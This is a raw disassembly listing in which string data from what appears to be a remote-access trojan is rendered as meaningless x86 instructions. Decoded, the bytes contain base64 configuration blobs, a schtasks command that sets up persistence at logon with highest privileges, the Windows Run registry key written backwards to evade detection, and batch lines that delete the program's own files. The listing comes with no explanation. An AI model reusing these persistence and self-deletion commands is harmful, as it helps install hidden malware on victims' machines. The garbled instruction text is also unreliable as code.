  40b5df:	78 00                	js     0x40b5e1
  40b5e1:	43                   	inc    %ebx
  40b5e2:	00 78 00             	add    %bh,0x0(%eax)
  40b5e5:	53                   	push   %ebx
  40b5e6:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b5ea:	00 4a 00             	add    %cl,0x0(%edx)
  40b5ed:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b5f1:	52                   	push   %edx
  40b5f2:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b5f6:	00 36                	add    %dh,(%esi)
  40b5f8:	00 42 00             	add    %al,0x0(%edx)
  40b5fb:	69 00 43 00 64 00    	imul   $0x640043,(%eax),%eax
  40b601:	57                   	push   %edi
  40b602:	00 65 00             	add    %ah,0x0(%ebp)
  40b605:	6c                   	insb   (%dx),%es:(%edi)
  40b606:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b60a:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40b60e:	00 7a 00             	add    %bh,0x0(%edx)
  40b611:	41                   	inc    %ecx
  40b612:	00 72 00             	add    %dh,0x0(%edx)
  40b615:	59                   	pop    %ecx
  40b616:	00 48 00             	add    %cl,0x0(%eax)
  40b619:	54                   	push   %esp
  40b61a:	00 35 00 75 00 42    	add    %dh,0x42007500
  40b620:	00 77 00             	add    %dh,0x0(%edi)
  40b623:	41                   	inc    %ecx
  40b624:	00 37                	add    %dh,(%edi)
  40b626:	00 76 00             	add    %dh,0x0(%esi)
  40b629:	44                   	inc    %esp
  40b62a:	00 36                	add    %dh,(%esi)
  40b62c:	00 70 00             	add    %dh,0x0(%eax)
  40b62f:	77 00                	ja     0x40b631
  40b631:	66 00 64 00 32       	data16 add %ah,0x32(%eax,%eax,1)
  40b636:	00 70 00             	add    %dh,0x0(%eax)
  40b639:	6b 00 36             	imul   $0x36,(%eax),%eax
  40b63c:	00 65 00             	add    %ah,0x0(%ebp)
  40b63f:	37                   	aaa
  40b640:	00 5a 00             	add    %bl,0x0(%edx)
  40b643:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40b647:	6e                   	outsb  %ds:(%esi),(%dx)
  40b648:	00 30                	add    %dh,(%eax)
  40b64a:	00 63 00             	add    %ah,0x0(%ebx)
  40b64d:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40b651:	56                   	push   %esi
  40b652:	00 67 00             	add    %ah,0x0(%edi)
  40b655:	48                   	dec    %eax
  40b656:	00 42 00             	add    %al,0x0(%edx)
  40b659:	2f                   	das
  40b65a:	00 56 00             	add    %dl,0x0(%esi)
  40b65d:	45                   	inc    %ebp
  40b65e:	00 35 00 65 00 42    	add    %dh,0x42006500
  40b664:	00 6e 00             	add    %ch,0x0(%esi)
  40b667:	47                   	inc    %edi
  40b668:	00 37                	add    %dh,(%edi)
  40b66a:	00 38                	add    %bh,(%eax)
  40b66c:	00 4a 00             	add    %cl,0x0(%edx)
  40b66f:	57                   	push   %edi
  40b670:	00 51 00             	add    %dl,0x0(%ecx)
  40b673:	55                   	push   %ebp
  40b674:	00 75 00             	add    %dh,0x0(%ebp)
  40b677:	57                   	push   %edi
  40b678:	00 39                	add    %bh,(%ecx)
  40b67a:	00 5a 00             	add    %bl,0x0(%edx)
  40b67d:	66 00 31             	data16 add %dh,(%ecx)
  40b680:	00 38                	add    %bh,(%eax)
  40b682:	00 45 00             	add    %al,0x0(%ebp)
  40b685:	4b                   	dec    %ebx
  40b686:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b68a:	00 5a 00             	add    %bl,0x0(%edx)
  40b68d:	6a 00                	push   $0x0
  40b68f:	44                   	inc    %esp
  40b690:	00 77 00             	add    %dh,0x0(%edi)
  40b693:	69 00 5a 00 53 00    	imul   $0x53005a,(%eax),%eax
  40b699:	67 00 3d             	add    %bh,(%di)
  40b69c:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b6a2:	5a                   	pop    %edx
  40b6a3:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40b6a7:	00 58 00             	add    %bl,0x0(%eax)
  40b6aa:	42                   	inc    %edx
  40b6ab:	00 72 00             	add    %dh,0x0(%edx)
  40b6ae:	68 00 4f 00 51       	push   $0x51004f00
  40b6b3:	00 70 00             	add    %dh,0x0(%eax)
  40b6b6:	53                   	push   %ebx
  40b6b7:	00 36                	add    %dh,(%esi)
  40b6b9:	00 30                	add    %dh,(%eax)
  40b6bb:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40b6bf:	00 52 00             	add    %dl,0x0(%edx)
  40b6c2:	33 00                	xor    (%eax),%eax
  40b6c4:	50                   	push   %eax
  40b6c5:	00 6e 00             	add    %ch,0x0(%esi)
  40b6c8:	42                   	inc    %edx
  40b6c9:	00 45 00             	add    %al,0x0(%ebp)
  40b6cc:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40b6d0:	52                   	push   %edx
  40b6d1:	00 38                	add    %bh,(%eax)
  40b6d3:	00 69 00             	add    %ch,0x0(%ecx)
  40b6d6:	56                   	push   %esi
  40b6d7:	00 36                	add    %dh,(%esi)
  40b6d9:	00 46 00             	add    %al,0x0(%esi)
  40b6dc:	79 00                	jns    0x40b6de
  40b6de:	4a                   	dec    %edx
  40b6df:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6e2:	4f                   	dec    %edi
  40b6e3:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b6e7:	00 51 00             	add    %dl,0x0(%ecx)
  40b6ea:	49                   	dec    %ecx
  40b6eb:	00 63 00             	add    %ah,0x0(%ebx)
  40b6ee:	45                   	inc    %ebp
  40b6ef:	00 42 00             	add    %al,0x0(%edx)
  40b6f2:	6d                   	insl   (%dx),%es:(%edi)
  40b6f3:	00 5a 00             	add    %bl,0x0(%edx)
  40b6f6:	66 00 37             	data16 add %dh,(%edi)
  40b6f9:	00 78 00             	add    %bh,0x0(%eax)
  40b6fc:	30 00                	xor    %al,(%eax)
  40b6fe:	53                   	push   %ebx
  40b6ff:	00 4e 00             	add    %cl,0x0(%esi)
  40b702:	6d                   	insl   (%dx),%es:(%edi)
  40b703:	00 6a 00             	add    %ch,0x0(%edx)
  40b706:	41                   	inc    %ecx
  40b707:	00 70 00             	add    %dh,0x0(%eax)
  40b70a:	76 00                	jbe    0x40b70c
  40b70c:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40b710:	74 00                	je     0x40b712
  40b712:	45                   	inc    %ebp
  40b713:	00 6a 00             	add    %ch,0x0(%edx)
  40b716:	63 00                	arpl   %eax,(%eax)
  40b718:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b71c:	49                   	dec    %ecx
  40b71d:	00 33                	add    %dh,(%ebx)
  40b71f:	00 31                	add    %dh,(%ecx)
  40b721:	00 51 00             	add    %dl,0x0(%ecx)
  40b724:	37                   	aaa
  40b725:	00 7a 00             	add    %bh,0x0(%edx)
  40b728:	57                   	push   %edi
  40b729:	00 6d 00             	add    %ch,0x0(%ebp)
  40b72c:	77 00                	ja     0x40b72e
  40b72e:	49                   	dec    %ecx
  40b72f:	00 62 00             	add    %ah,0x0(%edx)
  40b732:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b736:	74 00                	je     0x40b738
  40b738:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40b73c:	46                   	inc    %esi
  40b73d:	00 63 00             	add    %ah,0x0(%ebx)
  40b740:	36 00 74 00 4a       	add    %dh,%ss:0x4a(%eax,%eax,1)
  40b745:	00 65 00             	add    %ah,0x0(%ebp)
  40b748:	50                   	push   %eax
  40b749:	00 6e 00             	add    %ch,0x0(%esi)
  40b74c:	41                   	inc    %ecx
  40b74d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b753:	80 b1 47 00 67 00 5a 	xorb   $0x5a,0x670047(%ecx)
  40b75a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b75d:	37                   	aaa
  40b75e:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40b762:	00 4f 00             	add    %cl,0x0(%edi)
  40b765:	38 00                	cmp    %al,(%eax)
  40b767:	56                   	push   %esi
  40b768:	00 69 00             	add    %ch,0x0(%ecx)
  40b76b:	37                   	aaa
  40b76c:	00 48 00             	add    %cl,0x0(%eax)
  40b76f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b770:	00 75 00             	add    %dh,0x0(%ebp)
  40b773:	42                   	inc    %edx
  40b774:	00 48 00             	add    %cl,0x0(%eax)
  40b777:	73 00                	jae    0x40b779
  40b779:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b77d:	52                   	push   %edx
  40b77e:	00 62 00             	add    %ah,0x0(%edx)
  40b781:	34 00                	xor    $0x0,%al
  40b783:	69 00 35 00 66 00    	imul   $0x660035,(%eax),%eax
  40b789:	61                   	popa
  40b78a:	00 68 00             	add    %ch,0x0(%eax)
  40b78d:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40b791:	77 00                	ja     0x40b793
  40b793:	50                   	push   %eax
  40b794:	00 57 00             	add    %dl,0x0(%edi)
  40b797:	54                   	push   %esp
  40b798:	00 71 00             	add    %dh,0x0(%ecx)
  40b79b:	75 00                	jne    0x40b79d
  40b79d:	32 00                	xor    (%eax),%al
  40b79f:	51                   	push   %ecx
  40b7a0:	00 4e 00             	add    %cl,0x0(%esi)
  40b7a3:	68 00 6e 00 71       	push   $0x71006e00
  40b7a8:	00 39                	add    %bh,(%ecx)
  40b7aa:	00 59 00             	add    %bl,0x0(%ecx)
  40b7ad:	78 00                	js     0x40b7af
  40b7af:	39 00                	cmp    %eax,(%eax)
  40b7b1:	67 00 66 00          	add    %ah,0x0(%bp)
  40b7b5:	4a                   	dec    %edx
  40b7b6:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b7ba:	00 38                	add    %bh,(%eax)
  40b7bc:	00 70 00             	add    %dh,0x0(%eax)
  40b7bf:	42                   	inc    %edx
  40b7c0:	00 31                	add    %dh,(%ecx)
  40b7c2:	00 70 00             	add    %dh,0x0(%eax)
  40b7c5:	51                   	push   %ecx
  40b7c6:	00 5a 00             	add    %bl,0x0(%edx)
  40b7c9:	2b 00                	sub    (%eax),%eax
  40b7cb:	78 00                	js     0x40b7cd
  40b7cd:	6d                   	insl   (%dx),%es:(%edi)
  40b7ce:	00 4e 00             	add    %cl,0x0(%esi)
  40b7d1:	2b 00                	sub    (%eax),%eax
  40b7d3:	58                   	pop    %eax
  40b7d4:	00 37                	add    %dh,(%edi)
  40b7d6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b7d9:	63 00                	arpl   %eax,(%eax)
  40b7db:	6d                   	insl   (%dx),%es:(%edi)
  40b7dc:	00 35 00 67 00 6a    	add    %dh,0x6a006700
  40b7e2:	00 78 00             	add    %bh,0x0(%eax)
  40b7e5:	58                   	pop    %eax
  40b7e6:	00 70 00             	add    %dh,0x0(%eax)
  40b7e9:	42                   	inc    %edx
  40b7ea:	00 76 00             	add    %dh,0x0(%esi)
  40b7ed:	74 00                	je     0x40b7ef
  40b7ef:	6c                   	insb   (%dx),%es:(%edi)
  40b7f0:	00 37                	add    %dh,(%edi)
  40b7f2:	00 62 00             	add    %ah,0x0(%edx)
  40b7f5:	37                   	aaa
  40b7f6:	00 59 00             	add    %bl,0x0(%ecx)
  40b7f9:	71 00                	jno    0x40b7fb
  40b7fb:	63 00                	arpl   %eax,(%eax)
  40b7fd:	4d                   	dec    %ebp
  40b7fe:	00 77 00             	add    %dh,0x0(%edi)
  40b801:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b806:	80 b1 50 00 64 00 76 	xorb   $0x76,0x640050(%ecx)
  40b80d:	00 51 00             	add    %dl,0x0(%ecx)
  40b810:	5a                   	pop    %edx
  40b811:	00 30                	add    %dh,(%eax)
  40b813:	00 53 00             	add    %dl,0x0(%ebx)
  40b816:	66 00 30             	data16 add %dh,(%eax)
  40b819:	00 56 00             	add    %dl,0x0(%esi)
  40b81c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b81d:	00 38                	add    %bh,(%eax)
  40b81f:	00 30                	add    %dh,(%eax)
  40b821:	00 31                	add    %dh,(%ecx)
  40b823:	00 6a 00             	add    %ch,0x0(%edx)
  40b826:	44                   	inc    %esp
  40b827:	00 43 00             	add    %al,0x0(%ebx)
  40b82a:	56                   	push   %esi
  40b82b:	00 65 00             	add    %ah,0x0(%ebp)
  40b82e:	2f                   	das
  40b82f:	00 39                	add    %bh,(%ecx)
  40b831:	00 78 00             	add    %bh,0x0(%eax)
  40b834:	57                   	push   %edi
  40b835:	00 50 00             	add    %dl,0x0(%eax)
  40b838:	78 00                	js     0x40b83a
  40b83a:	34 00                	xor    $0x0,%al
  40b83c:	69 00 68 00 49 00    	imul   $0x490068,(%eax),%eax
  40b842:	33 00                	xor    (%eax),%eax
  40b844:	50                   	push   %eax
  40b845:	00 68 00             	add    %ch,0x0(%eax)
  40b848:	30 00                	xor    %al,(%eax)
  40b84a:	67 00 44 00          	add    %al,0x0(%si)
  40b84e:	41                   	inc    %ecx
  40b84f:	00 76 00             	add    %dh,0x0(%esi)
  40b852:	58                   	pop    %eax
  40b853:	00 38                	add    %bh,(%eax)
  40b855:	00 50 00             	add    %dl,0x0(%eax)
  40b858:	67 00 2b             	add    %ch,(%bp,%di)
  40b85b:	00 41 00             	add    %al,0x0(%ecx)
  40b85e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b85f:	00 59 00             	add    %bl,0x0(%ecx)
  40b862:	78 00                	js     0x40b864
  40b864:	63 00                	arpl   %eax,(%eax)
  40b866:	52                   	push   %edx
  40b867:	00 4e 00             	add    %cl,0x0(%esi)
  40b86a:	45                   	inc    %ebp
  40b86b:	00 2b                	add    %ch,(%ebx)
  40b86d:	00 75 00             	add    %dh,0x0(%ebp)
  40b870:	62 00                	bound  %eax,(%eax)
  40b872:	30 00                	xor    %al,(%eax)
  40b874:	5a                   	pop    %edx
  40b875:	00 7a 00             	add    %bh,0x0(%edx)
  40b878:	79 00                	jns    0x40b87a
  40b87a:	6d                   	insl   (%dx),%es:(%edi)
  40b87b:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b87f:	00 6a 00             	add    %ch,0x0(%edx)
  40b882:	4f                   	dec    %edi
  40b883:	00 73 00             	add    %dh,0x0(%ebx)
  40b886:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40b88a:	54                   	push   %esp
  40b88b:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b88f:	00 31                	add    %dh,(%ecx)
  40b891:	00 58 00             	add    %bl,0x0(%eax)
  40b894:	35 00 39 00 38       	xor    $0x38003900,%eax
  40b899:	00 72 00             	add    %dh,0x0(%edx)
  40b89c:	35 00 41 00 73       	xor    $0x73004100,%eax
  40b8a1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8a4:	5a                   	pop    %edx
  40b8a5:	00 43 00             	add    %al,0x0(%ebx)
  40b8a8:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b8ac:	4b                   	dec    %ebx
  40b8ad:	00 79 00             	add    %bh,0x0(%ecx)
  40b8b0:	58                   	pop    %eax
  40b8b1:	00 77 00             	add    %dh,0x0(%edi)
  40b8b4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b8b9:	03 33                	add    (%ebx),%esi
  40b8bb:	00 00                	add    %al,(%eax)
  40b8bd:	80 b1 4f 00 30 00 6e 	xorb   $0x6e,0x30004f(%ecx)
  40b8c4:	00 77 00             	add    %dh,0x0(%edi)
  40b8c7:	4c                   	dec    %esp
  40b8c8:	00 76 00             	add    %dh,0x0(%esi)
  40b8cb:	59                   	pop    %ecx
  40b8cc:	00 7a 00             	add    %bh,0x0(%edx)
  40b8cf:	4b                   	dec    %ebx
  40b8d0:	00 55 00             	add    %dl,0x0(%ebp)
  40b8d3:	39 00                	cmp    %eax,(%eax)
  40b8d5:	4b                   	dec    %ebx
  40b8d6:	00 32                	add    %dh,(%edx)
  40b8d8:	00 69 00             	add    %ch,0x0(%ecx)
  40b8db:	68 00 62 00 42       	push   $0x42006200
  40b8e0:	00 68 00             	add    %ch,0x0(%eax)
  40b8e3:	70 00                	jo     0x40b8e5
  40b8e5:	51                   	push   %ecx
  40b8e6:	00 7a 00             	add    %bh,0x0(%edx)
  40b8e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8ea:	00 59 00             	add    %bl,0x0(%ecx)
  40b8ed:	4f                   	dec    %edi
  40b8ee:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b8f2:	00 46 00             	add    %al,0x0(%esi)
  40b8f5:	6d                   	insl   (%dx),%es:(%edi)
  40b8f6:	00 67 00             	add    %ah,0x0(%edi)
  40b8f9:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40b8fd:	6c                   	insb   (%dx),%es:(%edi)
  40b8fe:	00 57 00             	add    %dl,0x0(%edi)
  40b901:	30 00                	xor    %al,(%eax)
  40b903:	77 00                	ja     0x40b905
  40b905:	75 00                	jne    0x40b907
  40b907:	4b                   	dec    %ebx
  40b908:	00 7a 00             	add    %bh,0x0(%edx)
  40b90b:	31 00                	xor    %eax,(%eax)
  40b90d:	4f                   	dec    %edi
  40b90e:	00 55 00             	add    %dl,0x0(%ebp)
  40b911:	51                   	push   %ecx
  40b912:	00 38                	add    %bh,(%eax)
  40b914:	00 46 00             	add    %al,0x0(%esi)
  40b917:	54                   	push   %esp
  40b918:	00 42 00             	add    %al,0x0(%edx)
  40b91b:	2b 00                	sub    (%eax),%eax
  40b91d:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b920:	00 6b 00             	add    %ch,0x0(%ebx)
  40b923:	45                   	inc    %ebp
  40b924:	00 48 00             	add    %cl,0x0(%eax)
  40b927:	54                   	push   %esp
  40b928:	00 56 00             	add    %dl,0x0(%esi)
  40b92b:	44                   	inc    %esp
  40b92c:	00 31                	add    %dh,(%ecx)
  40b92e:	00 63 00             	add    %ah,0x0(%ebx)
  40b931:	38 00                	cmp    %al,(%eax)
  40b933:	53                   	push   %ebx
  40b934:	00 59 00             	add    %bl,0x0(%ecx)
  40b937:	37                   	aaa
  40b938:	00 45 00             	add    %al,0x0(%ebp)
  40b93b:	59                   	pop    %ecx
  40b93c:	00 75 00             	add    %dh,0x0(%ebp)
  40b93f:	46                   	inc    %esi
  40b940:	00 73 00             	add    %dh,0x0(%ebx)
  40b943:	38 00                	cmp    %al,(%eax)
  40b945:	6c                   	insb   (%dx),%es:(%edi)
  40b946:	00 41 00             	add    %al,0x0(%ecx)
  40b949:	4b                   	dec    %ebx
  40b94a:	00 63 00             	add    %ah,0x0(%ebx)
  40b94d:	4d                   	dec    %ebp
  40b94e:	00 38                	add    %bh,(%eax)
  40b950:	00 5a 00             	add    %bl,0x0(%edx)
  40b953:	72 00                	jb     0x40b955
  40b955:	33 00                	xor    (%eax),%eax
  40b957:	4d                   	dec    %ebp
  40b958:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40b95c:	00 41 00             	add    %al,0x0(%ecx)
  40b95f:	47                   	inc    %edi
  40b960:	00 76 00             	add    %dh,0x0(%esi)
  40b963:	74 00                	je     0x40b965
  40b965:	70 00                	jo     0x40b967
  40b967:	49                   	dec    %ecx
  40b968:	00 41 00             	add    %al,0x0(%ecx)
  40b96b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b970:	09 6e 00             	or     %ebp,0x0(%esi)
  40b973:	75 00                	jne    0x40b975
  40b975:	6c                   	insb   (%dx),%es:(%edi)
  40b976:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b97a:	01 00                	add    %eax,(%eax)
  40b97c:	03 3a                	add    (%edx),%edi
  40b97e:	00 00                	add    %al,(%eax)
  40b980:	0d 50 00 61 00       	or     $0x610050,%eax
  40b985:	63 00                	arpl   %eax,(%eax)
  40b987:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b98a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b98e:	09 50 00             	or     %edx,0x0(%eax)
  40b991:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b997:	00 0f                	add    %cl,(%edi)
  40b999:	4d                   	dec    %ebp
  40b99a:	00 65 00             	add    %ah,0x0(%ebp)
  40b99d:	73 00                	jae    0x40b99f
  40b99f:	73 00                	jae    0x40b9a1
  40b9a1:	61                   	popa
  40b9a2:	00 67 00             	add    %ah,0x0(%edi)
  40b9a5:	65 00 00             	add    %al,%gs:(%eax)
  40b9a8:	07                   	pop    %es
  40b9a9:	63 00                	arpl   %eax,(%eax)
  40b9ab:	6d                   	insl   (%dx),%es:(%edi)
  40b9ac:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b9b0:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b9b6:	00 73 00             	add    %dh,0x0(%ebx)
  40b9b9:	63 00                	arpl   %eax,(%eax)
  40b9bb:	68 00 74 00 61       	push   $0x61007400
  40b9c0:	00 73 00             	add    %dh,0x0(%ebx)
  40b9c3:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b9c6:	00 20                	add    %ah,(%eax)
  40b9c8:	00 2f                	add    %ch,(%edi)
  40b9ca:	00 63 00             	add    %ah,0x0(%ebx)
  40b9cd:	72 00                	jb     0x40b9cf
  40b9cf:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b9d3:	74 00                	je     0x40b9d5
  40b9d5:	65 00 20             	add    %ah,%gs:(%eax)
  40b9d8:	00 2f                	add    %ch,(%edi)
  40b9da:	00 66 00             	add    %ah,0x0(%esi)
  40b9dd:	20 00                	and    %al,(%eax)
  40b9df:	2f                   	das
  40b9e0:	00 73 00             	add    %dh,0x0(%ebx)
  40b9e3:	63 00                	arpl   %eax,(%eax)
  40b9e5:	20 00                	and    %al,(%eax)
  40b9e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9e8:	00 6e 00             	add    %ch,0x0(%esi)
  40b9eb:	6c                   	insb   (%dx),%es:(%edi)
  40b9ec:	00 6f 00             	add    %ch,0x0(%edi)
  40b9ef:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b9f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9f4:	00 20                	add    %ah,(%eax)
  40b9f6:	00 2f                	add    %ch,(%edi)
  40b9f8:	00 72 00             	add    %dh,0x0(%edx)
  40b9fb:	6c                   	insb   (%dx),%es:(%edi)
  40b9fc:	00 20                	add    %ah,(%eax)
  40b9fe:	00 68 00             	add    %ch,0x0(%eax)
  40ba01:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40ba07:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ba0b:	74 00                	je     0x40ba0d
  40ba0d:	20 00                	and    %al,(%eax)
  40ba0f:	2f                   	das
  40ba10:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40ba14:	00 20                	add    %ah,(%eax)
  40ba16:	00 22                	add    %ah,(%edx)
  40ba18:	00 00                	add    %al,(%eax)
  40ba1a:	11 22                	adc    %esp,(%edx)
  40ba1c:	00 20                	add    %ah,(%eax)
  40ba1e:	00 2f                	add    %ch,(%edi)
  40ba20:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40ba24:	00 20                	add    %ah,(%eax)
  40ba26:	00 27                	add    %ah,(%edi)
  40ba28:	00 22                	add    %ah,(%edx)
  40ba2a:	00 01                	add    %al,(%ecx)
  40ba2c:	13 22                	adc    (%edx),%esp
  40ba2e:	00 27                	add    %ah,(%edi)
  40ba30:	00 20                	add    %ah,(%eax)
  40ba32:	00 26                	add    %ah,(%esi)
  40ba34:	00 20                	add    %ah,(%eax)
  40ba36:	00 65 00             	add    %ah,0x0(%ebp)
  40ba39:	78 00                	js     0x40ba3b
  40ba3b:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40ba41:	5c                   	pop    %esp
  40ba42:	00 6e 00             	add    %ch,0x0(%esi)
  40ba45:	75 00                	jne    0x40ba47
  40ba47:	52                   	push   %edx
  40ba48:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40ba4c:	00 6f 00             	add    %ch,0x0(%edi)
  40ba4f:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40ba55:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40ba59:	74 00                	je     0x40ba5b
  40ba5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba5c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba5f:	72 00                	jb     0x40ba61
  40ba61:	72 00                	jb     0x40ba63
  40ba63:	75 00                	jne    0x40ba65
  40ba65:	43                   	inc    %ebx
  40ba66:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40ba6a:	00 77 00             	add    %dh,0x0(%edi)
  40ba6d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba6e:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40ba72:	00 69 00             	add    %ch,0x0(%ecx)
  40ba75:	57                   	push   %edi
  40ba76:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40ba7a:	00 66 00             	add    %ah,0x0(%esi)
  40ba7d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba7e:	00 73 00             	add    %dh,0x0(%ebx)
  40ba81:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba82:	00 72 00             	add    %dh,0x0(%edx)
  40ba85:	63 00                	arpl   %eax,(%eax)
  40ba87:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40ba8d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba91:	61                   	popa
  40ba92:	00 77 00             	add    %dh,0x0(%edi)
  40ba95:	74 00                	je     0x40ba97
  40ba97:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba9b:	53                   	push   %ebx
  40ba9c:	00 00                	add    %al,(%eax)
  40ba9e:	03 22                	add    (%edx),%esp
  40baa0:	00 00                	add    %al,(%eax)
  40baa2:	09 2e                	or     %ebp,(%esi)
  40baa4:	00 62 00             	add    %ah,0x0(%edx)
  40baa7:	61                   	popa
  40baa8:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40baac:	13 40 00             	adc    0x0(%eax),%eax
  40baaf:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bab3:	68 00 6f 00 20       	push   $0x20006f00
  40bab8:	00 6f 00             	add    %ch,0x0(%edi)
  40babb:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40babf:	00 1f                	add    %bl,(%edi)
  40bac1:	74 00                	je     0x40bac3
  40bac3:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40bac9:	6f                   	outsl  %ds:(%esi),(%dx)
  40baca:	00 75 00             	add    %dh,0x0(%ebp)
  40bacd:	74 00                	je     0x40bacf
  40bacf:	20 00                	and    %al,(%eax)
  40bad1:	33 00                	xor    (%eax),%eax
  40bad3:	20 00                	and    %al,(%eax)
  40bad5:	3e 00 20             	add    %ah,%ds:(%eax)
  40bad8:	00 4e 00             	add    %cl,0x0(%esi)
  40badb:	55                   	push   %ebp
  40badc:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bae0:	15 53 00 54 00       	adc    $0x540053,%eax
  40bae5:	41                   	inc    %ecx
  40bae6:	00 52 00             	add    %dl,0x0(%edx)
  40bae9:	54                   	push   %esp
  40baea:	00 20                	add    %ah,(%eax)
  40baec:	00 22                	add    %ah,(%edx)
  40baee:	00 22                	add    %ah,(%edx)
  40baf0:	00 20                	add    %ah,(%eax)
  40baf2:	00 22                	add    %ah,(%edx)
  40baf4:	00 00                	add    %al,(%eax)
  40baf6:	07                   	pop    %es
  40baf7:	43                   	inc    %ebx
  40baf8:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40bafc:	00 00                	add    %al,(%eax)
  40bafe:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40bb02:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40bb06:	00 22                	add    %ah,(%edx)
  40bb08:	00 00                	add    %al,(%eax)
  40bb0a:	0f 22 00             	mov    %eax,%cr0
  40bb0d:	20 00                	and    %al,(%eax)
  40bb0f:	2f                   	das
  40bb10:	00 66 00             	add    %ah,0x0(%esi)
  40bb13:	20 00                	and    %al,(%eax)
  40bb15:	2f                   	das
  40bb16:	00 71 00             	add    %dh,0x0(%ecx)
  40bb19:	00 05 78 00 70 00    	add    %al,0x700078
  40bb1f:	00 45 53             	add    %al,0x53(%ebp)
  40bb22:	00 65 00             	add    %ah,0x0(%ebp)
  40bb25:	6c                   	insb   (%dx),%es:(%edi)
  40bb26:	00 65 00             	add    %ah,0x0(%ebp)
  40bb29:	63 00                	arpl   %eax,(%eax)
  40bb2b:	74 00                	je     0x40bb2d
  40bb2d:	20 00                	and    %al,(%eax)
  40bb2f:	2a 00                	sub    (%eax),%al
  40bb31:	20 00                	and    %al,(%eax)
  40bb33:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb37:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb38:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb3b:	20 00                	and    %al,(%eax)
  40bb3d:	57                   	push   %edi
  40bb3e:	00 69 00             	add    %ch,0x0(%ecx)
  40bb41:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb42:	00 33                	add    %dh,(%ebx)
  40bb44:	00 32                	add    %dh,(%edx)
  40bb46:	00 5f 00             	add    %bl,0x0(%edi)
  40bb49:	43                   	inc    %ebx
  40bb4a:	00 6f 00             	add    %ch,0x0(%edi)
